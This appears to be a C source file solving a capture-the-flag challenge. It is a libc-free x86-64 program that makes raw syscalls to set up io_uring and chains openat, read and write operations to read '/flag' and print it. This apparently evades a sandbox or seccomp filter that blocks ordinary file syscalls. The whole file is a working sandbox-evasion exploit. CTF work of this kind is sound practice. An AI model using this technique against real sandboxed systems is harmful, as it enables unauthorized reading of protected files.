#define _GNU_SOURCE

#include <fcntl.h>
#include <linux/io_uring.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/syscall.h>
#include <unistd.h>

#define ALWAYS_INLINE [[clang::always_inline]] inline
#define ALIGNED(X) __attribute__((aligned(X)))
#define PAGE_SIZE (4096)
#define ENTRIES (3)

typedef struct iouring_ctx {
  int ring_fd;
  unsigned *sring_tail, *sring_mask, *cring_head, *cring_tail, *cring_mask;
  struct io_uring_sqe *sqes;
  struct io_uring_cqe *cqes;
  int registered_files[1];
  uint8_t ring[PAGE_SIZE] ALIGNED(PAGE_SIZE);
  uint8_t sqes_buf[PAGE_SIZE] ALIGNED(PAGE_SIZE);
} iouring_ctx;

ALWAYS_INLINE void *memset(void *src, int val, size_t num) {
  char v = val & 0xff;
  uint8_t *data = (uint8_t *)src;

  // Copy the byte in al, rcx times into rdi
  __asm__ volatile("rep stosb\n" : "+D"(data), "+c"(num) : "a"(v) : "memory");

  return src;
}

ALWAYS_INLINE void *memcpy(void *restrict dest, const void *restrict src,
                           size_t n) {
  void *data = dest;
  __asm__ volatile("rep movsb\n" : "+D"(data), "+S"(src), "+c"(n) : : "memory");
  return dest;
}

ALWAYS_INLINE int io_uring_setup(unsigned entries, struct io_uring_params *p) {
  int ret;
  __asm__ volatile("syscall\n"
                   : "=a"(ret)
                   : "a"(__NR_io_uring_setup), "D"(entries), "S"(p)
                   : "rcx", "r11", "memory");
  return ret;
}

ALWAYS_INLINE int io_uring_enter(int fd, uint32_t to_submit,
                                 uint32_t min_complete, uint32_t flags,
                                 const void *argp, size_t argsz) {
  register unsigned int r10_flags __asm__("r10") = flags;
  register const void *r8_argp __asm__("r8") = argp;
  register size_t r9_argsz __asm__("r9") = argsz;

  int ret;
  __asm__ volatile("syscall\n"
                   : "=a"(ret)
                   : "a"(__NR_io_uring_enter), "D"(fd), "S"(to_submit),
                     "d"(min_complete), "r"(r10_flags), "r"(r8_argp),
                     "r"(r9_argsz)
                   : "rcx", "r11", "memory");

  return ret;
}

ALWAYS_INLINE int io_uring_register(int fd, unsigned int op, void *arg,
                                    unsigned int nr_args) {
  register unsigned int r10_nr_args __asm__("r10") = nr_args;
  int ret;
  __asm__ volatile("syscall\n"
                   : "=a"(ret)
                   : "a"(__NR_io_uring_register), "D"(fd), "S"(op), "d"(arg),
                     "r"(r10_nr_args)
                   : "rcx", "r11", "memory");
  return ret;
}

[[noreturn]] ALWAYS_INLINE int exit_group(int code) {
  __asm__ volatile("syscall\n"
                   :
                   : "a"(__NR_exit_group), "D"(code)
                   : "rcx", "r11", "memory");
  __builtin_unreachable();
}

ALWAYS_INLINE void setup(iouring_ctx *ctx) {
  __u64 ring_addr = (__u64)ctx->ring;
  __u64 sqes_addr = (__u64)ctx->sqes_buf;

  struct io_uring_params p = {
      .flags = IORING_SETUP_NO_MMAP | IORING_SETUP_NO_SQARRAY,
      .sq_off.user_addr = sqes_addr,
      .cq_off.user_addr = ring_addr,
  };

  ctx->ring_fd = io_uring_setup(ENTRIES, &p);
  if (ctx->ring_fd == -1) {
    exit_group(1);
  }

  ctx->sring_tail = (unsigned *)(ring_addr + p.sq_off.tail);
  ctx->sring_mask = (unsigned *)(ring_addr + p.sq_off.ring_mask);

  ctx->cring_head = (unsigned *)(ring_addr + p.cq_off.head);
  ctx->cring_tail = (unsigned *)(ring_addr + p.cq_off.tail);
  ctx->cring_mask = (unsigned *)(ring_addr + p.cq_off.ring_mask);
  ctx->cqes = (struct io_uring_cqe *)(ring_addr + p.cq_off.cqes);
  ctx->sqes = (struct io_uring_sqe *)ctx->sqes_buf;

  if (io_uring_register(ctx->ring_fd, IORING_REGISTER_FILES,
                        ctx->registered_files, 1) == -1) {
    exit_group(5);
  }
}

ALWAYS_INLINE void add_to_sq(iouring_ctx *ctx, struct io_uring_sqe *sqe) {
  // Get the next SQE from the array.
  unsigned tail, index;
  tail = *ctx->sring_tail;
  index = tail & (*ctx->sring_mask);

  struct io_uring_sqe *dst_sqe = &ctx->sqes[index];
  memcpy(dst_sqe, sqe, sizeof(struct io_uring_sqe));

  tail++;
  atomic_store_explicit((_Atomic unsigned *)ctx->sring_tail, tail,
                        memory_order_release);
}

ALWAYS_INLINE int read_from_cq(iouring_ctx *ctx) {
  unsigned head = *ctx->cring_head;
  if (head == atomic_load_explicit((_Atomic unsigned *)ctx->cring_tail,
                                   memory_order_acquire)) {
    exit_group(3);
  }

  unsigned index = head & *(ctx->cring_mask);
  struct io_uring_cqe *cqe = &ctx->cqes[index];
  if (cqe->res < 0) {
    exit_group(cqe->res);
  }

  head++;
  atomic_store_explicit((_Atomic unsigned *)ctx->cring_head, head,
                        memory_order_release);
  return cqe->res;
}

[[gnu::section(".text.entry")]] void _start(void) {
  uint8_t buff[PAGE_SIZE] = {};

  iouring_ctx ctx = {
      .registered_files = {-1},
  };
  setup(&ctx);

  {
    // /flag
    uint64_t flag_path = 0x0067616c662f;

    struct io_uring_sqe openat_sqe = {
        .opcode = IORING_OP_OPENAT,
        .fd = AT_FDCWD,
        .len = 0,  // mode
        .open_flags = O_RDONLY,
        .addr = (__u64)&flag_path,
        .flags = IOSQE_IO_LINK,
        .file_index = 1,
    };

    add_to_sq(&ctx, &openat_sqe);
  }
  {
    struct io_uring_sqe read_sqe = {
        .opcode = IORING_OP_READ,
        .fd = 0,
        .addr = (__u64)buff,
        .len = sizeof(buff),
        .flags = IOSQE_IO_HARDLINK | IOSQE_FIXED_FILE,
    };

    add_to_sq(&ctx, &read_sqe);
  }
  {
    struct io_uring_sqe write_sqe = {
        .opcode = IORING_OP_WRITE,
        .fd = STDERR_FILENO,
        .addr = (__u64)buff,
        .len = sizeof(buff),
        .flags = IOSQE_IO_HARDLINK,
        .off = -1,
    };

    add_to_sq(&ctx, &write_sqe);
  }

  int res = io_uring_enter(ctx.ring_fd, 3, 3, IORING_ENTER_GETEVENTS, NULL, 0);
  if (res == -1) {
    exit_group(2);
  }

  read_from_cq(&ctx);
  read_from_cq(&ctx);
  read_from_cq(&ctx);

  exit_group(0);
}
